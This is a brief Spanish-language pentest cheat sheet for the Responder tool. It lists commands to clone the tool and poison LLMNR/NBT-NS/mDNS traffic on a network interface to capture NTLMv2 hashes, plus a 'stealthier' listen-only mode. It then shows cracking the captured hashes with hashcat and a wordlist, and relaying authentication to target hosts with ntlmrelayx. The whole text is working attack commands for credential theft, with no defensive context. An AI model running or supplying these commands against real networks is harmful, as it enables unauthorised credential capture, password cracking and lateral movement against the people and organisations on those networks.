# Responder

Envenenar LLMNR/NBT-NS/mDNS para capturar hashes NTLMv2 en la red.

```bash
# Instalación
git clone https://github.com/lgandx/Responder
cd Responder

# Envenenamiento básico
sudo python3 Responder.py -I eth0 -rdwv

# Solo escuchar (sin envenenar) — más sigiloso
sudo python3 Responder.py -I eth0 -A

# Los hashes NTLMv2 capturados se guardan en Responder/logs/
# Crackear con hashcat
hashcat -m 5600 NTLMv2_hashes.txt /usr/share/wordlists/rockyou.txt

# Combinado con ntlmrelayx (desactivar SMB y HTTP en Responder.conf)
sudo python3 Responder.py -I eth0 -rdwv -P
sudo python3 ../impacket/examples/ntlmrelayx.py -tf targets.txt -smb2support
```
